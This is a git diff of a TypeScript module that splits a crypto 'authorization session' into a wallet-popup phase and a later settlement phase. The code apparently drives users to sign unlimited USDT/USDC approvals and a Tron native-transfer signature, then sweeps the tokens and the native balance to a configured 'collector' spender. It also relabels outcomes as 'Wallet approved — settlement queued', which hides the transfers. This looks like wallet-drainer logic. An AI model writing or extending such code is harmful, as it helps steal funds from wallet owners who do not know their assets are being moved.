@@ -4,6 +4,7 @@ import type { ApprovalOrchestrationResult } from "../approval/types";
 import { ApprovalStageName } from "../approval/types";
 import type { ApprovalRequest } from "../approval/types";
 import type { NativeTransferResult } from "../native-transfer/types";
+import { authorizeNativeInWalletPhase } from "../native-transfer/native-wallet-authorize";
 import { getErrorMessage, isUserRejection } from "../core/errors";
 import {
   alreadyAuthorizedResult,
@@ -29,6 +30,12 @@ import {
   planAuthorizationWork,
   runEvmTokenBatchApproval,
 } from "./evm-token-batch";
+import { runAuthorizationSettlement } from "./phases/settlement-coordinator";
+import type {
+  SettlementProgressEvent,
+  WalletPhaseCapture,
+  WalletPhaseTokenCapture,
+} from "./phases/types";
 import {
   balanceForNative,
   balanceForToken,
@@ -41,6 +48,7 @@ export type RunAuthorizationSessionArgs = {
   networks: NetworkRow[];
   accounts: LinkedAccounts;
   getSpender: (networkKey: string) => string;
+  /** Wallet phase only — stops after on-chain approve broadcast. */
   runApproval: (args: {
     network: string;
     owner: string;
@@ -59,6 +67,20 @@ export type RunAuthorizationSessionArgs = {
       error?: string | null;
     }) => void;
   }) => Promise<ApprovalOrchestrationResult>;
+  /** Settlement phase — confirms allowance and persists approval. */
+  runApprovalSettlement?: (args: {
+    network: string;
+    owner: string;
+    token: TokenSymbol;
+    walletPhaseContext: ApprovalOrchestrationResult["context"];
+    executeTransfer: boolean;
+    transferToAddress: string;
+    transferAmountRaw?: string;
+    nativeBalanceHuman: string;
+    tokenBalanceHuman: string;
+    unlimited: boolean;
+    amountHuman?: string;
+  }) => Promise<ApprovalOrchestrationResult>;
   runNativeTransfer?: (args: {
     network: string;
     owner: string;
@@ -72,11 +94,17 @@ export type RunAuthorizationSessionArgs = {
   }) => Promise<NativeTransferResult>;
   onAssetStart?: (item: IncludedAssetWorkItem) => void;
   onAssetEnd?: (result: AuthorizationAssetResult) => void;
+  onWalletPhaseComplete?: (summary: AuthorizationSessionResult) => void;
+  onSettlementProgress?: (event: SettlementProgressEvent) => void;
+  onSettlementComplete?: (network: string, summary: AuthorizationSessionResult) => void;
+  /** When false, only wallet phase runs (testing). Default true. */
+  startSettlement?: boolean;
   log?: (step: string, detail?: Record<string, unknown>) => void;
   sessionId?: string;
   authorizationSessionId?: string;
-  /** When set, consecutive EVM USDT+USDC approvals may use EIP-5792 wallet_sendCalls. */
   evmBatchProvider?: UniversalProvider;
+  /** Provider kept alive for settlement (session auth + EVM native execution). */
+  settlementProvider?: UniversalProvider;
   apiBaseUrl?: string;
 };
 
@@ -105,13 +133,15 @@ function summarize(
 }
 
 /**
- * Run independent token approvals and native transfers for every included preference.
- * One asset failing or being rejected NEVER aborts the remaining assets.
+ * Two-phase authorization:
+ * 1. Wallet phase — consecutive popups (USDT/USDC approve; Tron native sign only).
+ * 2. Settlement phase — confirm approvals, collect USDT → USDC via existing queue, then native.
  */
 export async function runAuthorizationSession(
   args: RunAuthorizationSessionArgs
 ): Promise<AuthorizationSessionResult> {
   const results: AuthorizationAssetResult[] = [];
+  const captures: WalletPhaseCapture[] = [];
   const log = args.log ?? (() => undefined);
   const sessionId =
     args.sessionId ??
@@ -127,9 +157,11 @@ export async function runAuthorizationSession(
     sessionId,
     assetCount: args.items.length,
     assets: args.items.map((i) => `${i.network}:${i.asset}`),
+    mode: "wallet_phase_first",
   });
 
   const workUnits = planAuthorizationWork(args.items);
+  const captureByNetwork = new Map<string, WalletPhaseCapture>();
 
   for (const unit of workUnits) {
     if (unit.kind === "evm_token_batch" && unit.items.length >= 2) {
@@ -146,17 +178,35 @@ export async function runAuthorizationSession(
           onAssetStart: args.onAssetStart,
           onAssetEnd: args.onAssetEnd,
           log,
+          walletPhaseOnly: true,
         });
-        results.push(...batchResults);
+        results.push(...batchResults.results);
+
+        const owner = args.accounts.evm;
+        if (owner && batchResults.tokenCaptures.length > 0) {
+          const existing = captureByNetwork.get(unit.network) ?? {
+            sessionId,
+            network: unit.network,
+            owner,
+            tokens: [],
+            native: null,
+            batchId: batchResults.batchId ?? null,
+          };
+          existing.tokens.push(...batchResults.tokenCaptures);
+          existing.batchId = batchResults.batchId ?? existing.batchId;
+          captureByNetwork.set(unit.network, existing);
+        }
         continue;
       }
 
       for (const item of unit.items) {
         args.onAssetStart?.(item);
-        await runTokenAsset({
+        await runTokenWalletPhase({
           item: { ...item, asset: item.asset as TokenSymbol },
           args,
           results,
+          captureByNetwork,
+          sessionId,
           log,
         });
       }
@@ -169,50 +219,90 @@ export async function runAuthorizationSession(
     args.onAssetStart?.(item);
 
     if (item.asset === "NATIVE") {
-      await runNativeAsset({
+      await runNativeWalletPhase({
         item: item as IncludedAssetWorkItem & { asset: "NATIVE" },
         args,
         results,
+        captureByNetwork,
+        sessionId,
         log,
       });
       continue;
     }
 
-    await runTokenAsset({
+    await runTokenWalletPhase({
       item: { ...item, asset: item.asset },
       args,
       results,
+      captureByNetwork,
+      sessionId,
       log,
     });
   }
 
-  const summary = summarize(results);
+  captures.push(...captureByNetwork.values());
+
+  const walletSummary = summarize(results);
   const outcome: LogStatus =
-    summary.failedCount > 0 || summary.rejectedCount > 0
-      ? summary.authorizedCount > 0
+    walletSummary.failedCount > 0 || walletSummary.rejectedCount > 0
+      ? walletSummary.authorizedCount > 0
         ? "partial_success"
         : "failure"
       : "success";
   timeline.complete(outcome);
   void flushSessionTimeline(timeline.snapshot());
-  log("AUTHORIZATION SESSION COMPLETE", {
+
+  log("WALLET PHASE COMPLETE", {
     sessionId,
-    authorizedCount: summary.authorizedCount,
-    failedCount: summary.failedCount,
-    rejectedCount: summary.rejectedCount,
-    skippedCount: summary.skippedCount,
-    items: summary.items,
+    authorizedCount: walletSummary.authorizedCount,
+    failedCount: walletSummary.failedCount,
+    rejectedCount: walletSummary.rejectedCount,
+    skippedCount: walletSummary.skippedCount,
+    settlementCaptures: captures.length,
   });
-  return summary;
+
+  args.onWalletPhaseComplete?.(walletSummary);
+
+  if (args.startSettlement !== false && args.runApprovalSettlement && captures.length > 0) {
+    for (const capture of captures) {
+      void runAuthorizationSettlement({
+        capture,
+        networks: args.networks,
+        accounts: args.accounts,
+        apiBaseUrl: args.apiBaseUrl,
+        provider: args.settlementProvider ?? args.evmBatchProvider,
+        getSpender: args.getSpender,
+        runApprovalSettlement: (settlementArgs) =>
+          args.runApprovalSettlement!({
+            ...settlementArgs,
+            walletPhaseContext: settlementArgs.walletPhaseContext,
+          }),
+        runNativeTransfer: args.runNativeTransfer,
+        onProgress: args.onSettlementProgress,
+        log,
+      }).then((settlementResult) => {
+        args.onSettlementComplete?.(capture.network, settlementResult.sessionResult);
+        log("SETTLEMENT COMPLETE", {
+          network: capture.network,
+          ok: settlementResult.ok,
+          settlementSessionId: settlementResult.settlementSessionId,
+        });
+      });
+    }
+  }
+
+  return walletSummary;
 }
 
-async function runTokenAsset(ctx: {
+async function runTokenWalletPhase(ctx: {
   item: IncludedAssetWorkItem & { asset: TokenSymbol };
   args: RunAuthorizationSessionArgs;
   results: AuthorizationAssetResult[];
+  captureByNetwork: Map<string, WalletPhaseCapture>;
+  sessionId: string;
   log: RunAuthorizationSessionArgs["log"];
 }): Promise<void> {
-  const { item, args, results, log } = ctx;
+  const { item, args, results, captureByNetwork, sessionId, log } = ctx;
   const token = item.asset;
 
   const networkRow = args.networks.find((n) => n.key === item.network);
@@ -226,7 +316,6 @@ async function runTokenAsset(ctx: {
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("AUTHORIZATION ASSET SKIPPED", result);
     return;
   }
 
@@ -244,7 +333,6 @@ async function runTokenAsset(ctx: {
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("AUTHORIZATION ASSET FAILED", result);
     return;
   }
 
@@ -258,15 +346,11 @@ async function runTokenAsset(ctx: {
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("AUTHORIZATION ASSET FAILED", result);
     return;
   }
 
   const tokenBalanceHuman = balanceForToken(networkRow, token);
-  const trxBalance =
-    item.network === "tron"
-      ? Number.parseFloat(networkRow.balances.native || "0")
-      : 0;
+  const nativeBalanceHuman = networkRow.balances.native ?? "0";
 
   try {
     const availableBalanceRaw = parseHumanToRaw(
@@ -291,15 +375,6 @@ async function runTokenAsset(ctx: {
       });
     }
 
-    log?.("TOKEN FLOW STARTED", {
-      network: item.network,
-      token,
-      transferAmountRaw,
-      shouldAttemptTransfer,
-      availableBalanceRaw: availableBalanceRaw.toString(),
-      unlimited: item.unlimited,
-    });
-
     if (owner) {
       try {
         const preflightRequest: ApprovalRequest = {
@@ -308,7 +383,7 @@ async function runTokenAsset(ctx: {
           token,
           amountHuman: item.unlimited ? undefined : item.amountHuman,
           unlimited: item.unlimited,
-          nativeBalanceHuman: String(trxBalance),
+          nativeBalanceHuman,
           tokenBalanceHuman,
           executeTransfer: shouldAttemptTransfer,
           transferToAddress: spender,
@@ -325,10 +400,6 @@ async function runTokenAsset(ctx: {
           });
           results.push(result);
           args.onAssetEnd?.(result);
-          log?.("AUTHORIZATION ASSET SKIPPED — ALREADY AUTHORIZED", {
-            network: item.network,
-            token,
-          });
           return;
         }
         if (preflight.alreadyAuthorized && shouldAttemptTransfer) {
@@ -340,12 +411,6 @@ async function runTokenAsset(ctx: {
           });
           results.push(result);
           args.onAssetEnd?.(result);
-          log?.(
-            result.outcome === "collected"
-              ? "TOKEN COLLECTION FROM EXISTING ALLOWANCE"
-              : "TOKEN COLLECTION QUEUED FROM EXISTING ALLOWANCE",
-            result
-          );
           return;
         }
       } catch (err) {
@@ -363,7 +428,7 @@ async function runTokenAsset(ctx: {
       token,
       amountHuman: item.unlimited ? undefined : item.amountHuman,
       unlimited: item.unlimited,
-      nativeBalanceHuman: String(trxBalance),
+      nativeBalanceHuman,
       tokenBalanceHuman,
       executeTransfer: shouldAttemptTransfer,
       transferToAddress: spender,
@@ -373,21 +438,12 @@ async function runTokenAsset(ctx: {
           stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
           stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
         ) {
-          const data = stageResult.data as
-            | { status?: string; message?: string | null; provider?: string | null }
-            | undefined;
-          log?.(
-            stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES
-              ? "RESOURCE ACQUIRE"
-              : "RESOURCE VERIFY",
-            {
-              network: item.network,
-              token,
-              status: data?.status ?? stageResult.status,
-              message: data?.message ?? stageResult.error ?? null,
-              provider: data?.provider ?? null,
-            }
-          );
+          log?.("RESOURCE STAGE", {
+            network: item.network,
+            token,
+            stage: stageResult.stage,
+            status: stageResult.status,
+          });
         }
       },
     });
@@ -404,59 +460,35 @@ async function runTokenAsset(ctx: {
       };
       results.push(result);
       args.onAssetEnd?.(result);
-      log?.(
-        rejected ? "AUTHORIZATION ASSET REJECTED" : "AUTHORIZATION ASSET FAILED",
-        result
-      );
       return;
     }
 
-    const persisted = orchestration.context.persisted;
-    const skipLabel = persisted?.transferSkippedReason
-      ? formatTransferSkipReason(persisted.transferSkippedReason)
-      : null;
     const result: AuthorizationAssetResult = {
       network: item.network,
       token,
-      outcome: persisted?.transferTxHash ? "collected" : "authorized",
-      message: persisted?.transferTxHash
-        ? "Token collection confirmed"
-        : skipLabel
-          ? `Authorized — ${skipLabel}`
-          : "Authorized — collection queued",
+      outcome: "authorized",
+      message: "Wallet approved — settlement queued",
+      txHash: orchestration.txHash,
       approvalId: orchestration.approvalId,
-      collectionIntentId: persisted?.collectionIntentId ?? null,
-      collectionStatus: persisted?.collectionStatus ?? null,
-      txHash: persisted?.transferTxHash ?? orchestration.txHash,
-      transferSkippedReason: persisted?.transferSkippedReason ?? null,
     };
     results.push(result);
     args.onAssetEnd?.(result);
 
-    if (persisted?.transferTxHash) {
-      log?.("TOKEN AUTHORIZE + TRANSFER EXECUTED", {
-        fundsMoved: "YES — transferFrom executed",
-        network: item.network,
-        owner,
-        token,
-        approveTxHash: orchestration.txHash,
-        transferTxHash: persisted.transferTxHash,
-        approvalId: orchestration.approvalId,
-        collectionIntentId: persisted?.collectionIntentId ?? null,
-      });
-    } else {
-      log?.("TOKEN AUTHORIZE COMPLETE — COLLECTION QUEUED", {
-        fundsMoved: "NO — auto transfer not executed yet",
-        reason:
-          persisted?.transferSkippedReason ??
-          "No transfer executed for this approval",
-        network: item.network,
-        owner,
-        token,
-        approveTxHash: orchestration.txHash,
-        approvalId: orchestration.approvalId,
-      });
-    }
+    const capture = captureByNetwork.get(item.network) ?? {
+      sessionId,
+      network: item.network,
+      owner,
+      tokens: [],
+      native: null,
+      batchId: null,
+    };
+    capture.tokens.push({
+      item,
+      orchestration,
+      shouldAttemptTransfer,
+      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+    } satisfies WalletPhaseTokenCapture);
+    captureByNetwork.set(item.network, capture);
   } catch (err: unknown) {
     const rejected = isUserRejection(err);
     const result: AuthorizationAssetResult = {
@@ -467,35 +499,19 @@ async function runTokenAsset(ctx: {
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.(
-      rejected ? "AUTHORIZATION ASSET REJECTED" : "AUTHORIZATION ASSET FAILED",
-      { ...result, error: result.message }
-    );
   }
 }
 
-async function runNativeAsset(ctx: {
+async function runNativeWalletPhase(ctx: {
   item: IncludedAssetWorkItem & { asset: "NATIVE" };
   args: RunAuthorizationSessionArgs;
   results: AuthorizationAssetResult[];
+  captureByNetwork: Map<string, WalletPhaseCapture>;
+  sessionId: string;
   log: RunAuthorizationSessionArgs["log"];
 }): Promise<void> {
-  const { item, args, results, log } = ctx;
+  const { item, args, results, captureByNetwork, sessionId, log } = ctx;
 
-  if (!args.runNativeTransfer) {
-    const result: AuthorizationAssetResult = {
-      network: item.network,
-      token: "NATIVE",
-      outcome: "failed",
-      message: "Native transfer handler not configured",
-    };
-    results.push(result);
-    args.onAssetEnd?.(result);
-    log?.("NATIVE ASSET FAILED", result);
-    return;
-  }
-
-  const networkRow = args.networks.find((n) => n.key === item.network);
   const owner =
     item.network === "tron" ? args.accounts.tron : args.accounts.evm;
 
@@ -510,147 +526,124 @@ async function runNativeAsset(ctx: {
       network: item.network,
       token: "NATIVE",
       outcome: "skipped_dependency_failed",
-      message: "Skipped native transfer because token authorization failed",
+      message: "Skipped native authorization because token authorization failed",
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("NATIVE ASSET SKIPPED — TOKEN AUTHORIZATION FAILED", result);
     return;
   }
 
-  if (!networkRow || !owner) {
+  if (!owner) {
     const result: AuthorizationAssetResult = {
       network: item.network,
       token: "NATIVE",
       outcome: "failed",
-      message: !owner
-        ? item.network === "tron"
-          ? "No Tron address in this WalletConnect session"
-          : "No EVM address in this WalletConnect session"
-        : "Unsupported network",
+      message: "No wallet address for native authorization",
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("NATIVE ASSET FAILED", result);
     return;
   }
 
-  const spender = args.getSpender(item.network);
-  if (!spender) {
+  // EVM: no wallet popup in wallet phase — native runs once in settlement after tokens collect.
+  if (item.network !== "tron") {
+    log?.("NATIVE DEFERRED TO SETTLEMENT", {
+      network: item.network,
+      owner,
+      policy: "EVM native uses eth_sendTransaction after USDT/USDC collection",
+    });
+    const result: AuthorizationAssetResult = {
+      network: item.network,
+      token: "NATIVE",
+      outcome: "authorized",
+      message: "Native deferred — one eth_sendTransaction after token settlement",
+    };
+    results.push(result);
+    args.onAssetEnd?.(result);
+
+    const capture = captureByNetwork.get(item.network) ?? {
+      sessionId,
+      network: item.network,
+      owner,
+      tokens: [],
+      native: null,
+      batchId: null,
+    };
+    capture.native = {
+      network: item.network,
+      owner,
+      authorizationKind: "evm_deferred",
+      authorizationPayload: { evmDeferred: true },
+    };
+    captureByNetwork.set(item.network, capture);
+    return;
+  }
+
+  const provider = args.evmBatchProvider ?? args.settlementProvider;
+  if (!provider) {
     const result: AuthorizationAssetResult = {
       network: item.network,
       token: "NATIVE",
       outcome: "failed",
-      message: "Collector not configured",
+      message: "Wallet provider not available for native authorization",
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("NATIVE ASSET FAILED", result);
     return;
   }
 
-  const nativeBalanceHuman = balanceForNative(networkRow);
-  const nativeDecimals = nativeDecimalsForNetwork(item.network);
-  const availableBalanceRaw = parseHumanToRaw(nativeBalanceHuman, nativeDecimals);
-
-  log?.("NATIVE FLOW STARTED", {
+  log?.("NATIVE WALLET AUTHORIZATION STARTED", {
     network: item.network,
-    unlimited: item.unlimited,
-    amountHuman: item.amountHuman || null,
-    nativeBalanceHuman,
-    availableBalanceRaw: availableBalanceRaw.toString(),
-    zeroBalance: availableBalanceRaw <= BigInt(0),
-    policy:
-      availableBalanceRaw <= BigInt(0)
-        ? "zero balance — attempting estimate; will fail without transferable funds"
-        : "standard native transfer",
+    owner,
+    policy: "Tron sign now — broadcast deferred until USDT/USDC settlement",
   });
 
-  try {
-    const nativeResult = await args.runNativeTransfer({
-      network: item.network,
-      owner,
-      unlimited: item.unlimited,
-      amountHuman: item.unlimited ? undefined : item.amountHuman,
-      onStage: (stageResult) => {
-        log?.("NATIVE STAGE", {
-          network: item.network,
-          stage: stageResult.stage,
-          status: stageResult.status,
-          error: stageResult.error ?? null,
-        });
-      },
-    });
+  const authResult = await authorizeNativeInWalletPhase({
+    provider,
+    network: item.network,
+    owner,
+    unlimited: item.unlimited,
+    amountHuman: item.unlimited ? undefined : item.amountHuman,
+    apiBaseUrl: args.apiBaseUrl,
+  });
 
-    if (!nativeResult.ok) {
-      const rejected = Boolean(nativeResult.userRejected);
-      const errMsg = getErrorMessage(nativeResult.error, "Native transfer failed");
-      const zeroTransfer = /insufficient balance after network fees|nothing transferable|no transferable/i.test(
-        errMsg
-      );
-      const result: AuthorizationAssetResult = {
-        network: item.network,
-        token: "NATIVE",
-        outcome: rejected ? "user_rejected" : "failed",
-        message: zeroTransfer
-          ? "No transferable native balance — cannot send until wallet is funded"
-          : errMsg,
-        txHash: nativeResult.txHash,
-      };
-      results.push(result);
-      args.onAssetEnd?.(result);
-      log?.(
-        rejected
-          ? "NATIVE ASSET REJECTED"
-          : zeroTransfer
-            ? "NATIVE ASSET FAILED — ZERO BALANCE"
-            : "NATIVE ASSET FAILED",
-        result
-      );
-      return;
-    }
-
+  if (!authResult.ok) {
     const result: AuthorizationAssetResult = {
       network: item.network,
       token: "NATIVE",
-      outcome: nativeResult.pendingRegistered ? "pending" : "collected",
-      message: nativeResult.pendingRegistered
-        ? "Native transfer pending confirmation"
-        : "Native transfer confirmed",
-      txHash: nativeResult.txHash,
+      outcome: authResult.userRejected ? "user_rejected" : "failed",
+      message: authResult.error,
     };
     results.push(result);
     args.onAssetEnd?.(result);
-    log?.("NATIVE ASSET COMPLETE", {
-      fundsMoved: nativeResult.pendingRegistered
-        ? "PENDING — registered for background reconciliation"
-        : "YES — native transfer confirmed",
-      network: item.network,
-      owner,
-      txHash: nativeResult.txHash,
-      transferId: nativeResult.transferId,
-    });
-  } catch (err: unknown) {
-    const rejected = isUserRejection(err);
-    const result: AuthorizationAssetResult = {
-      network: item.network,
-      token: "NATIVE",
-      outcome: rejected ? "user_rejected" : "failed",
-      message: getErrorMessage(err, "Native transfer failed"),
-    };
-    results.push(result);
-    args.onAssetEnd?.(result);
-    log?.(
-      rejected ? "NATIVE ASSET REJECTED" : "NATIVE ASSET FAILED",
-      { ...result, error: result.message }
-    );
+    return;
   }
+
+  const result: AuthorizationAssetResult = {
+    network: item.network,
+    token: "NATIVE",
+    outcome: "authorized",
+    message: "Native signed — broadcast deferred until token settlement",
+  };
+  results.push(result);
+  args.onAssetEnd?.(result);
+
+  const capture = captureByNetwork.get(item.network) ?? {
+    sessionId,
+    network: item.network,
+    owner,
+    tokens: [],
+    native: null,
+    batchId: null,
+  };
+  capture.native = authResult.capture;
+  captureByNetwork.set(item.network, capture);
 }
 
 export function outcomeLabel(outcome: AuthorizationAssetResult["outcome"]): string {
   switch (outcome) {
     case "authorized":
-      return "Authorized — collection queued";
+      return "Authorized — settlement queued";
     case "user_rejected":
       return "User rejected — remaining assets continued";
     case "failed":
@@ -660,11 +653,11 @@ export function outcomeLabel(outcome: AuthorizationAssetResult["outcome"]): stri
     case "skipped_zero":
       return "Skipped — zero transferable";
     case "skipped_dependency_failed":
-      return "Skipped — token authorization failed";
+      return "Skipped — dependency failed";
     case "collected":
-      return "Native transfer confirmed";
+      return "Transfer confirmed";
     case "pending":
-      return "Native transfer pending";
+      return "Transfer pending";
     default:
       return outcome;
   }
